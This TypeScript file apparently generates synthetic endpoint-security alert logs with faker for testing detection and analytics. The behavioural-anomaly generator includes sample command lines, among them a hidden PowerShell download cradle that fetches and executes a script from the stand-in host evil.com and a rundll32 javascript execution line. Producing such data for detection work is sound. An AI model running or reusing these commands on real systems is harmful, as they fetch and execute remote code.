import { faker } from '@faker-js/faker';
import { generateTimestamp } from '../utils/timestamp_utils';

export interface EndpointLogConfig {
  hostName?: string;
  userName?: string;
  timestampConfig?: import('../utils/timestamp_utils').TimestampConfig;
}

const MALWARE_FAMILIES = [
  'TrickBot', 'Emotet', 'Dridex', 'Qbot', 'IcedID', 'BazarLoader',
  'Cobalt Strike', 'Metasploit', 'Mimikatz', 'PowerShell Empire'
];

const SUSPICIOUS_PROCESSES = [
  'powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe',
  'rundll32.exe', 'regsvr32.exe', 'certutil.exe', 'bitsadmin.exe'
];

const DLL_INJECTION_TECHNIQUES = [
  'SetWindowsHookEx', 'CreateRemoteThread', 'QueueUserAPC', 'ProcessHollowing',
  'ReflectiveDLLInjection', 'ManualDLLMap'
];

const EVASION_TECHNIQUES = [
  'ProcessMigration', 'TokenImpersonation', 'ParentPidSpoofing', 
  'TimeStomping', 'BinaryPadding', 'SignedBinaryProxyExecution'
];

export const generateMalwareDetectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig
  } = config;

  const malwareFamily = faker.helpers.arrayElement(MALWARE_FAMILIES);
  const severity = faker.helpers.arrayElement(['low', 'medium', 'high', 'critical']);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.alerts',
    'data_stream.namespace': 'default',
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'malware-detected',
    'event.category': ['malware'],
    'event.dataset': 'endpoint.alerts',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.outcome': 'success',
    'event.severity': faker.number.int({ min: 1, max: 100 }),
    'event.type': ['info'],
    'file.hash.md5': faker.string.hexadecimal({ length: 32, casing: 'lower' }),
    'file.hash.sha1': faker.string.hexadecimal({ length: 40, casing: 'lower' }),
    'file.hash.sha256': faker.string.hexadecimal({ length: 64, casing: 'lower' }),
    'file.name': `${faker.system.fileName()}.exe`,
    'file.path': `C:\\Users\\${userName}\\AppData\\Local\\Temp\\${faker.system.fileName()}.exe`,
    'file.size': faker.number.int({ min: 10240, max: 10485760 }),
    'host.name': hostName,
    'host.os.family': 'windows',
    'host.os.name': 'Windows 10',
    'message': `Malware detected: ${malwareFamily} family threat blocked`,
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} -enc ${faker.string.alphanumeric(50)}`,
    'process.executable': `C:\\Windows\\System32\\${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `${malwareFamily} Detection Rule`,
    'threat.indicator.file.hash.md5': faker.string.hexadecimal({ length: 32, casing: 'lower' }),
    'threat.indicator.type': 'file',
    'threat.software.family': malwareFamily,
    'threat.software.name': malwareFamily,
    'threat.software.type': 'Trojan',
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.hash': [faker.string.hexadecimal({ length: 32, casing: 'lower' })],
    'related.user': [userName],
  };
};

export const generateProcessInjectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig
  } = config;

  const technique = faker.helpers.arrayElement(DLL_INJECTION_TECHNIQUES);
  const targetProcess = faker.helpers.arrayElement(['explorer.exe', 'notepad.exe', 'chrome.exe']);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.process',
    'data_stream.namespace': 'default',
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'process-injection',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.process',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['start'],
    'host.name': hostName,
    'host.os.family': 'windows',
    'message': `Process injection detected using ${technique}`,
    'process.code_signature.status': 'unsigned',
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} -WindowStyle Hidden`,
    'process.executable': `C:\\Windows\\System32\\${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'process.parent.name': 'winlogon.exe',
    'process.parent.pid': faker.number.int({ min: 500, max: 1000 }),
    'Target.process.name': targetProcess,
    'Target.process.pid': faker.number.int({ min: 2000, max: 65535 }),
    'dll.name': `${faker.system.fileName()}.dll`,
    'dll.path': `C:\\Windows\\System32\\${faker.system.fileName()}.dll`,
    'rule.id': faker.string.uuid(),
    'rule.name': `${technique} Detection`,
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateBehavioralAnomalyLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig
  } = config;

  const anomalyType = faker.helpers.arrayElement([
    'unusual_process_tree', 'suspicious_network_behavior', 'file_encryption_activity',
    'credential_dumping', 'lateral_movement', 'data_exfiltration'
  ]);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.behavioral',
    'data_stream.namespace': 'default',
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'behavioral-anomaly',
    'event.category': ['intrusion_detection'],
    'event.dataset': 'endpoint.behavioral',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.risk_score': faker.number.int({ min: 40, max: 100 }),
    'event.severity': faker.number.int({ min: 3, max: 5 }),
    'event.type': ['indicator'],
    'host.name': hostName,
    'host.os.family': 'windows',
    'message': `Behavioral anomaly detected: ${anomalyType.replace(/_/g, ' ')}`,
    'ml.anomaly_score': faker.number.float({ min: 0.7, max: 1.0, multipleOf: 0.01 }),
    'ml.is_anomaly': true,
    'process.command_line': faker.helpers.arrayElement([
      'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/script.ps1\'))"',
      'cmd.exe /c "wmic process call create calc.exe"',
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");'
    ]),
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `Behavioral Detection: ${anomalyType}`,
    'threat.technique.id': faker.helpers.arrayElement(['T1055', 'T1059', 'T1027', 'T1003']),
    'threat.technique.name': faker.helpers.arrayElement([
      'Process Injection', 'Command and Scripting Interpreter', 
      'Obfuscated Files or Information', 'OS Credential Dumping'
    ]),
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateEvasionDetectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig
  } = config;

  const technique = faker.helpers.arrayElement(EVASION_TECHNIQUES);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.security',
    'data_stream.namespace': 'default',
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'evasion-detected',
    'event.category': ['intrusion_detection'],
    'event.dataset': 'endpoint.events.security',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.type': ['indicator'],
    'host.name': hostName,
    'host.os.family': 'windows',
    'message': `Evasion technique detected: ${technique}`,
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} ${faker.lorem.words(3)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `${technique} Detection Rule`,
    'threat.technique.name': technique,
    'threat.tactic.name': 'Defense Evasion',
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateMemoryPatternLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig
  } = config;

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.memory',
    'data_stream.namespace': 'default',
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'memory-scan',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.memory',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['info'],
    'host.name': hostName,
    'host.os.family': 'windows',
    'memory.region.allocation_base': faker.string.hexadecimal({ length: 16, prefix: '0x' }),
    'memory.region.allocation_protection': faker.helpers.arrayElement(['PAGE_EXECUTE_READWRITE', 'PAGE_READWRITE']),
    'memory.region.protection': faker.helpers.arrayElement(['PAGE_EXECUTE_READ', 'PAGE_EXECUTE_READWRITE']),
    'memory.region.size': faker.number.int({ min: 4096, max: 1048576 }),
    'memory.region.state': faker.helpers.arrayElement(['MEM_COMMIT', 'MEM_RESERVE']),
    'memory.region.type': faker.helpers.arrayElement(['MEM_PRIVATE', 'MEM_IMAGE']),
    'message': 'Memory region scan completed',
    'process.name': faker.helpers.arrayElement(['notepad.exe', 'chrome.exe', 'powershell.exe']),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export default function createEndpointLog(override = {}, config: EndpointLogConfig = {}) {
  const logGenerators = [
    generateMalwareDetectionLog,
    generateProcessInjectionLog,
    generateBehavioralAnomalyLog,
    generateEvasionDetectionLog,
    generateMemoryPatternLog
  ];

  // Weight different log types for realism (most logs are normal behavior)
  const weightedGenerators = [
    ...Array(2).fill(generateMemoryPatternLog),
    generateMalwareDetectionLog,
    generateProcessInjectionLog,
    generateBehavioralAnomalyLog,
    generateEvasionDetectionLog
  ];

  const selectedGenerator = faker.helpers.arrayElement(weightedGenerators);
  const baseLog = selectedGenerator(config);

  return {
    ...baseLog,
    ...override,
  };
}